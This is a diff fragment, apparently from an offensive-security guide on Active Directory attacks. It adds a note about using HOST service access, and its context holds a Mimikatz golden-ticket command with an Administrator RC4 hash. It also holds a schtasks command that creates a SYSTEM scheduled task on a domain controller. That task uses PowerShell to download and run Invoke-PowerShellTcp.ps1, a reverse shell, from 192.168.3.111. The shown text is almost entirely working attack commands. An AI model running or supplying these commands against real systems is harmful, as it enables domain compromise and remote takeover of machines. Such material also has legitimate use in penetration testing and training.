@@ -188,6 +188,8 @@ kerberos::golden
 /rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt
 ```
 
+With HOST Service access you can now create a scheduled task on the target machine:-
+
 ```
 schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"
 ```
